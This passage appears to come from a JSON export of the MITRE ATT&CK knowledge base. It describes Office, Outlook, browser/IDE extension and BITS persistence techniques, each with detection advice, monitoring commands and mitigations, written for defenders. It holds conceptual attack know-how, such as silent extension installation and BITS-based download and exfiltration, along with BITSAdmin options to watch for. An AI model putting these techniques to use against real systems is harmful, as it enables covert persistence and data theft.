v13.52, Autoruns can detect tasks set up using the Office Test Registry key. <a href=\"https://researchcenter.paloaltonetworks.com/2016/07/unit42-technical-walkthrough-office-test-persistence-method-used-in-recent-sofacy-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Palo Alto Office Test Sofacy)</a>\n\nConsider monitoring Office processes for anomalous DLL loads.","platforms":["Windows","Office Suite"],"dataSources":["Windows Registry: Windows Registry Key Creation","Command: Command Execution","File: File Modification","Windows Registry: Windows Registry Key Modification","File: File Creation","Process: Process Creation","Module: Module Load"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Office applications from creating child processes and from writing potentially malicious executable content to disk. <a href=\"https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win10_asr)</a>"},{"id":"M1054","name":"Software Configuration","description":"Create the Registry key used to execute it and set the permissions to \"Read Control\" to prevent easy access to the key without administrator permissions or requiring Privilege Escalation. <a href=\"https://researchcenter.paloaltonetworks.com/2016/07/unit42-technical-walkthrough-office-test-persistence-method-used-in-recent-sofacy-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Palo Alto Office Test Sofacy)</a>"}]},{"id":"T1137.003","name":"Outlook Forms","description":"Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form. <a href=\"https://sensepost.com/blog/2017/outlook-forms-and-shells/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SensePost Outlook Forms)</a>\n\nOnce malicious forms have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user. <a href=\"https://sensepost.com/blog/2017/outlook-forms-and-shells/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SensePost Outlook Forms)</a>","detection":"Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output. <a href=\"https://docs.microsoft.com/en-us/office365/securitycompliance/detect-and-remediate-outlook-rules-forms-attack\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Detect Outlook Forms)</a> SensePost, whose tool Ruler can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage. <a href=\"https://github.com/sensepost/notruler\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SensePost NotRuler)</a>\n\nCollect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior.","platforms":["Windows","Office Suite"],"dataSources":["Application Log: Application Log Content","Command: Command Execution","Process: Process Creation"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Office applications from creating child processes and from writing potentially malicious executable content to disk. <a href=\"https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win10_asr)</a>"},{"id":"M1051","name":"Update Software","description":"For the Outlook methods, blocking macros may be ineffective as the Visual Basic engine used for these features is separate from the macro scripting engine. <a href=\"https://sensepost.com/blog/2017/outlook-forms-and-shells/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SensePost Outlook Forms)</a> Microsoft has released patches to try to address each issue. Ensure KB3191938 which blocks Outlook Visual Basic and displays a malicious code warning, KB4011091 which disables custom forms by default, and KB4011162 which removes the legacy Home Page feature, are applied to systems. <a href=\"https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SensePost Outlook Home Page)</a>"}]},{"id":"T1137.004","name":"Outlook Home Page","description":"Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page. <a href=\"https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SensePost Outlook Home Page)</a>\n\nOnce malicious home pages have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded. <a href=\"https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SensePost Outlook Home Page)</a>","detection":"Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output. <a href=\"https://docs.microsoft.com/en-us/office365/securitycompliance/detect-and-remediate-outlook-rules-forms-attack\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Detect Outlook Forms)</a> SensePost, whose tool Ruler can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage. <a href=\"https://github.com/sensepost/notruler\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SensePost NotRuler)</a>\n\nCollect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior.","platforms":["Windows","Office Suite"],"dataSources":["Application Log: Application Log Content","Command: Command Execution","Process: Process Creation"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Office applications from creating child processes and from writing potentially malicious executable content to disk. <a href=\"https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win10_asr)</a>"},{"id":"M1051","name":"Update Software","description":"For the Outlook methods, blocking macros may be ineffective as the Visual Basic engine used for these features is separate from the macro scripting engine. <a href=\"https://sensepost.com/blog/2017/outlook-forms-and-shells/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SensePost Outlook Forms)</a> Microsoft has released patches to try to address each issue. Ensure KB3191938 which blocks Outlook Visual Basic and displays a malicious code warning, KB4011091 which disables custom forms by default, and KB4011162 which removes the legacy Home Page feature, are applied to systems. <a href=\"https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SensePost Outlook Home Page)</a>"}]},{"id":"T1137.005","name":"Outlook Rules","description":"Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user. <a href=\"https://silentbreaksecurity.com/malicious-outlook-rules/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SilentBreak Outlook Rules)</a>\n\nOnce malicious rules have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user. <a href=\"https://silentbreaksecurity.com/malicious-outlook-rules/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SilentBreak Outlook Rules)</a>","detection":"Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output. <a href=\"https://docs.microsoft.com/en-us/office365/securitycompliance/detect-and-remediate-outlook-rules-forms-attack\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Detect Outlook Forms)</a> This PowerShell script is ineffective in gathering rules with modified <code>PRPR_RULE_MSG_NAME</code> and <code>PR_RULE_MSG_PROVIDER</code> properties caused by adversaries using a Microsoft Exchange Server Messaging API Editor (MAPI Editor), so only examination with the Exchange Administration tool MFCMapi can reveal these mail forwarding rules. <a href=\"https://blog.compass-security.com/2018/09/hidden-inbox-rules-in-microsoft-exchange/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Pfammatter - Hidden Inbox Rules)</a> SensePost, whose tool Ruler can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage. <a href=\"https://github.com/sensepost/notruler\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SensePost NotRuler)</a>\n\nCollect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior.","platforms":["Windows","Office Suite"],"dataSources":["Process: Process Creation","Application Log: Application Log Content","Command: Command Execution"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Office applications from creating child processes and from writing potentially malicious executable content to disk. <a href=\"https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win10_asr)</a>"},{"id":"M1051","name":"Update Software","description":"For the Outlook methods, blocking macros may be ineffective as the Visual Basic engine used for these features is separate from the macro scripting engine. <a href=\"https://sensepost.com/blog/2017/outlook-forms-and-shells/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SensePost Outlook Forms)</a> Microsoft has released patches to try to address each issue. Ensure KB3191938 which blocks Outlook Visual Basic and displays a malicious code warning, KB4011091 which disables custom forms by default, and KB4011162 which removes the legacy Home Page feature, are applied to systems. <a href=\"https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SensePost Outlook Home Page)</a>"}]},{"id":"T1137.006","name":"Add-ins","description":"Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs. <a href=\"https://support.office.com/article/Add-or-remove-add-ins-0af570c4-5cf3-4fa9-9b88-403625a0b460\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Office Add-ins)</a> There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. <a href=\"https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MRWLabs Office Persistence Add-ins)</a> <a href=\"https://summit.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s03-youve-got-mail.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye Mail CDS 2018)</a>\n\nAdd-ins can be used to obtain persistence because they can be set to execute code when an Office application starts.","detection":"Monitor and validate the Office trusted locations on the file system and audit the Registry entries relevant for enabling add-ins. <a href=\"https://www.221bluestreet.com/post/office-templates-and-globaldotname-a-stealthy-office-persistence-technique\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GlobalDotName Jun 2019)</a> <a href=\"https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MRWLabs Office Persistence Add-ins)</a>\n\nCollect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior","platforms":["Windows","Office Suite"],"dataSources":["Windows Registry: Windows Registry Key Modification","File: File Modification","Command: Command Execution","Windows Registry: Windows Registry Key Creation","Process: Process Creation","File: File Creation"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Office applications from creating child processes and from writing potentially malicious executable content to disk. <a href=\"https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win10_asr)</a>"}]}]},{"id":"T1176","name":"Software Extensions","description":"Adversaries may abuse software extensions to establish persistent access to victim systems. Software extensions are modular components that enhance or customize the functionality of software applications, including web browsers, Integrated Development Environments (IDEs), and other platforms. <a href=\"https://web.archive.org/web/20240608001937/https://kjaer.io/extension-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Chrome Extension C2 Malware)</a> <a href=\"https://blog.checkpoint.com/securing-the-cloud/malicious-vscode-extensions-with-more-than-45k-downloads-steal-pii-and-enable-backdoors/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Abramovsky VSCode Security)</a> Extensions are typically installed via official marketplaces, app stores, or manually loaded by users, and they often inherit the permissions and access levels of the host application. \n\n  \nMalicious extensions can be introduced through various methods, including social engineering, compromised marketplaces, or direct installation by users or by adversaries who have already gained access to a system. Malicious extensions can be named similarly or identically to benign extensions in marketplaces. Security mechanisms in extension marketplaces may be insufficient to detect malicious components, allowing adversaries to bypass automated scanners or exploit trust established during the installation process. Adversaries may also abuse benign extensions to achieve their objectives, such as using legitimate functionality to tunnel data or bypass security controls. \n\nThe modular nature of extensions and their integration with host applications make them an attractive target for adversaries seeking to exploit trusted software ecosystems. Detection can be challenging due to the inherent trust placed in extensions during installation and their ability to blend into normal application workflows.","detection":"Inventory and monitor browser extension installations that deviate from normal, expected, and benign extensions. Process and network monitoring can be used to detect browsers communicating with a C2 server. However, this may prove to be a difficult way of initially detecting a malicious extension depending on the nature and volume of the traffic it generates.\n\nMonitor for any new items written to the Registry or PE files written to disk. That may correlate with browser extension installation.\n\nOn macOS, monitor the command line for usage of the profiles tool, such as <code>profiles install -type=configuration</code>. Additionally, all installed extensions maintain a <code>plist</code> file in the <code>/Library/Managed Preferences/username/</code> directory. Ensure all listed files are in alignment with approved extensions. <a href=\"https://www.xorrior.com/No-Place-Like-Chrome/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: xorrior chrome extensions macOS)</a>","platforms":["Linux","macOS","Windows"],"dataSources":["Windows Registry: Windows Registry Key Creation","Process: Process Creation","Command: Command Execution","File: File Creation","Network Traffic: Network Connection Creation"],"mitigations":[{"id":"M1017","name":"User Training","description":"Train users to minimize extension use, and to only install trusted extensions."},{"id":"M1033","name":"Limit Software Installation","description":"Only install extensions from trusted sources that can be verified."},{"id":"M1038","name":"Execution Prevention","description":"Set an extension allow or deny list as appropriate for your security policy."},{"id":"M1047","name":"Audit","description":"Ensure extensions that are installed are the intended ones, as many malicious extensions may masquerade as legitimate ones."},{"id":"M1051","name":"Update Software","description":"Ensure operating systems and software are using the most current version."}],"subTechniques":[{"id":"T1176.001","name":"Browser Extensions","description":"Adversaries may abuse internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality to and customize aspects of internet browsers. They can be installed directly via a local file or custom URL or through a browser's app store - an official online platform where users can browse, install, and manage extensions for a specific web browser. Extensions generally inherit the web browser's permissions previously granted. <a href=\"https://en.wikipedia.org/wiki/Browser_extension\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Browser Extension)</a> <a href=\"https://developer.chrome.com/extensions\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Chrome Extensions Definition)</a> \n \nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores, so it may not be difficult for malicious extensions to defeat automated scanners. <a href=\"https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/43824.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malicious Chrome Extension Numbers)</a> Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary-controlled server or manipulate the mobile configuration file to silently install additional extensions. \n\nAdversaries may abuse how chromium-based browsers load extensions by modifying or replacing the Preferences and/or Secure Preferences files to silently install malicious extensions. When the browser is not running, adversaries can alter these files, ensuring the extension is loaded, granted desired permissions, and will persist in browser sessions. This method does not require user consent and extensions are silently loaded in the background from disk or from the browser's trusted store. <a href=\"https://blog.pulsedive.com/rilide-an-information-stealing-browser-extension/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Pulsedive)</a>\n  \nPrevious to macOS 11, adversaries could silently install browser extensions via the command line using the <code>profiles</code> tool to install malicious <code>.mobileconfig</code> files. In macOS 11+, the use of the <code>profiles</code> tool can no longer install configuration profiles; however, <code>.mobileconfig</code> files can be planted and installed with user interaction. <a href=\"https://www.xorrior.com/No-Place-Like-Chrome/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: xorrior chrome extensions macOS)</a> \n \nOnce the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence. <a href=\"https://www.ghacks.net/2017/09/19/first-chrome-extension-with-javascript-crypto-miner-detected/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Chrome Extension Crypto Miner)</a> <a href=\"https://www.icebrg.io/blog/malicious-chrome-extensions-enable-criminals-to-impact-over-half-a-million-users-and-global-businesses\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ICEBRG Chrome Extensions)</a> <a href=\"https://isc.sans.edu/forums/diary/BankerGoogleChromeExtensiontargetingBrazil/22722/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Banker Google Chrome Extension Steals Creds)</a> <a href=\"https://isc.sans.edu/forums/diary/CatchAll+Google+Chrome+Malicious+Extension+Steals+All+Posted+Data/22976/https:/threatpost.com/malicious-chrome-extension-steals-data-posted-to-any-website/128680/)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Catch All Chrome Extension)</a> \n\nThere have also been instances of botnets using a persistent backdoor through malicious Chrome extensions for Command and Control. <a href=\"https://www.welivesecurity.com/2017/07/20/stantinko-massive-adware-campaign-operating-covertly-since-2012/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Stantinko Botnet)</a> <a href=\"https://web.archive.org/web/20240608001937/https://kjaer.io/extension-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Chrome Extension C2 Malware)</a> Adversaries may also use browser extensions to modify browser permissions and components, privacy settings, and other security controls for Stealth. <a href=\"https://www.proofpoint.com/us/blog/threat-insight/ta413-leverages-new-friarfox-browser-extension-target-gmail-accounts-global\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Browers FriarFox)</a> <a href=\"https://www.microsoft.com/en-us/security/blog/2020/12/10/widespread-malware-campaign-seeks-to-silently-inject-ads-into-search-results-affects-multiple-browsers/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Browser Adrozek)</a>","detection":"","platforms":["Linux","Windows","macOS"],"dataSources":[],"mitigations":[{"id":"M1017","name":"User Training","description":"Close out all browser sessions when finished using them to prevent any potentially malicious extensions from continuing to run."},{"id":"M1033","name":"Limit Software Installation","description":"Only install browser extensions from trusted sources that can be verified. Browser extensions for some browsers can be controlled through Group Policy. Change settings to prevent the browser from installing extensions without sufficient permissions."},{"id":"M1038","name":"Execution Prevention","description":"Set a browser extension allow or deny list as appropriate for your security policy. <a href=\"http://www.technospot.net/blogs/block-chrome-extensions-using-google-chrome-group-policy-settings/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Technospot Chrome Extensions GP)</a>"},{"id":"M1047","name":"Audit","description":"Ensure extensions that are installed are the intended ones, as many malicious extensions will masquerade as legitimate ones."},{"id":"M1051","name":"Update Software","description":"Ensure operating systems and browsers are using the most current version."}]},{"id":"T1176.002","name":"IDE Extensions","description":"Adversaries may abuse an integrated development environment (IDE) extension to establish persistent access to victim systems. <a href=\"https://www.mnemonic.io/resources/blog/misuse-of-visual-studio-code-for-traffic-tunnelling/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mnemonic misuse visual studio)</a> IDEs such as Visual Studio Code, IntelliJ IDEA, and Eclipse support extensions - software components that add features like code linting, auto-completion, task automation, or integration with tools like Git and Docker. A malicious extension can be installed through an extension marketplace (i.e., Compromise Software Dependencies and Development Tools) or side-loaded directly into the IDE. <a href=\"https://blog.checkpoint.com/securing-the-cloud/malicious-vscode-extensions-with-more-than-45k-downloads-steal-pii-and-enable-backdoors/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Abramovsky VSCode Security)</a> <a href=\"https://thehackernews.com/2023/01/hackers-distributing-malicious-visual.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Lakshmanan Visual Studio Marketplace)</a>   \n\nIn addition to installing malicious extensions, adversaries may also leverage benign ones. For example, adversaries may establish persistent SSH tunnels via the use of the VSCode Remote SSH extension (i.e., IDE Tunneling).  \n\nTrust is typically established through the installation process; once installed, the malicious extension is run every time that the IDE is launched. The extension can then be used to execute arbitrary code, establish a backdoor, mine cryptocurrency, or exfiltrate data. <a href=\"https://blog.extensiontotal.com/mining-in-plain-sight-the-vs-code-extension-cryptojacking-campaign-19ca12904b59\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ExtensionTotal VSCode Extensions  2025)</a>","detection":"","platforms":["Linux","macOS","Windows"],"dataSources":[],"mitigations":[{"id":"M1017","name":"User Training","description":"Train users to minimize IDE extension use, and to only install trusted extensions."},{"id":"M1033","name":"Limit Software Installation","description":"Only install IDE extensions from trusted sources that can be verified."},{"id":"M1038","name":"Execution Prevention","description":"Set an IDE extension allow or deny list as appropriate for your security policy."},{"id":"M1047","name":"Audit","description":"Ensure extensions that are installed are the intended ones, as many malicious extensions may masquerade as legitimate ones."},{"id":"M1051","name":"Update Software","description":"Ensure operating systems and IDEs are using the most current version."}]}]},{"id":"T1197","name":"BITS Jobs","description":"Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM). <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft COM)</a> <a href=\"https://msdn.microsoft.com/library/windows/desktop/bb968799.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft BITS)</a> BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.\n\nThe interface to create and manage BITS jobs is accessible through PowerShell and the BITSAdmin tool. <a href=\"https://msdn.microsoft.com/library/windows/desktop/bb968799.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft BITS)</a> <a href=\"https://msdn.microsoft.com/library/aa362813.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft BITSAdmin)</a>\n\nAdversaries may abuse BITS to download (e.g. Ingress Tool Transfer), execute, and even clean up after running malicious code (e.g. Indicator Removal). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. <a href=\"https://www.secureworks.com/blog/malware-lingers-with-bits\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CTU BITS Malware June 2016)</a> <a href=\"https://arstechnica.com/information-technology/2007/05/malware-piggybacks-on-windows-background-intelligent-transfer-service/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mondok Windows PiggyBack BITS May 2007)</a> <a href=\"https://www.symantec.com/connect/blogs/malware-update-windows-update\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Symantec BITS May 2007)</a> BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots). <a href=\"https://researchcenter.paloaltonetworks.com/2017/11/unit42-uboatrat-navigates-east-asia/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PaloAlto UBoatRAT Nov 2017)</a> <a href=\"https://www.secureworks.com/blog/malware-lingers-with-bits\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CTU BITS Malware June 2016)</a>\n\nBITS upload functionalities can also be used to perform Exfiltration Over Alternative Protocol. <a href=\"https://www.secureworks.com/blog/malware-lingers-with-bits\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CTU BITS Malware June 2016)</a>","detection":"BITS runs as a service and its status can be checked with the Sc query utility (<code>sc query bits</code>). <a href=\"https://technet.microsoft.com/library/dd939934.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Issues with BITS July 2011)</a> Active BITS tasks can be enumerated using the BITSAdmin tool (<code>bitsadmin /list /allusers /verbose</code>). <a href=\"https://msdn.microsoft.com/library/windows/desktop/bb968799.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft BITS)</a>\n\nMonitor usage of the BITSAdmin tool (especially the ‘Transfer’, 'Create', 'AddFile', 'SetNotifyFlags', 'SetNotifyCmdLine', 'SetMinRetryDelay', 'SetCustomHeaders', and 'Resume' command options) <a href=\"https://msdn.microsoft.com/library/windows/desktop/bb968799.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft BITS)</a> Admin logs, PowerShell logs, and the Windows Event log for BITS activity. <a href=\"https://www.elastic.co/blog/hunting-for-persistence-using-elastic-security-part-1\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic - Hunting for Persistence Part 1)</a> Also consider investigating more detailed information about jobs by parsing the BITS job database. <a href=\"https://www.secureworks.com/blog/malware-lingers-with-bits\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CTU BITS Malware June 2016)</a>\n\nMonitor and analyze network activity generated by BITS. BITS jobs use HTTP(S) and SMB for remote connections and are tethered to the creating user and will only function when that user is logged on (this rule applies even if a user attaches the job to a service account). <a href=\"https://msdn.microsoft.com/library/windows/desktop/bb968799.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft BITS)</a>","platforms":["Windows"],"dataSources":["Command: Command Execution","Network Traffic: Network Connection Creation","Process: Process Creation","Service: Service Metadata"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Consider limiting access to the BITS interface to specific users or groups. <a href=\"https://www.symantec.com/connect/blogs/malware-update-windows-update\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Symantec BITS May 2007)</a>"},{"id":"M1028","name":"Operating System Configuration","description":"Consider reducing the default BITS job lifetime in Group Policy or by editing the <code>JobInactivityTimeout</code> and <code>MaxDownloadTime</code> Registry values in <code> HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\BITS</code>. <a href=\"https://msdn.microsoft.com/library/windows/desktop/bb968799.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft BITS)</a>"},{"id":"M1037","name":"Filter Network Traffic","description":"Modify network and/or host firewall rules, as well as other network controls, to only allow legitimate BITS traffic."}],"subTechniques":[]},{"id":"T1205","name":"Traffic Signaling","description":"Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. Port Knocking), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.\n\nAdversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r <a href=\"https://www.giac.org/paper/gcih/342/handle-cd00r-invisible-backdoor/103631\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hartrell cd00r 2002)</a>, is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.\n\nOn network devices, adversaries may use crafted packets to enable Network Device Authentication for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives. <a href=\"https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Synful Knock Evolution)</a> <a href=\"https://www.mandiant.com/resources/synful-knock-acis\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant - Synful Knock)</a> <a href=\"https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Blog Legacy Device Attacks)</a>  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage Patch System Image due to the monolithic nature of the architecture.\n\nAdversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement. <a href=\"https://www.bleepingcomputer.com/news/security/ryuk-ransomware-uses-wake-on-lan-to-encrypt-offline-devices/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Bleeping Computer - Ryuk WoL)</a> <a href=\"https://www.amd.com/system/files/TechDocs/20213.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AMD Magic Packet)</a>","detection":"Record network packets sent to and from the system, looking for extraneous packets that do not belong to established flows.\n\nThe Wake-on-LAN magic packet consists of 6 bytes of <code>FF</code> followed by sixteen repetitions of the target system's IEEE address. Seeing this string anywhere in a packet's payload may be indicative of a Wake-on-LAN attempt. <a 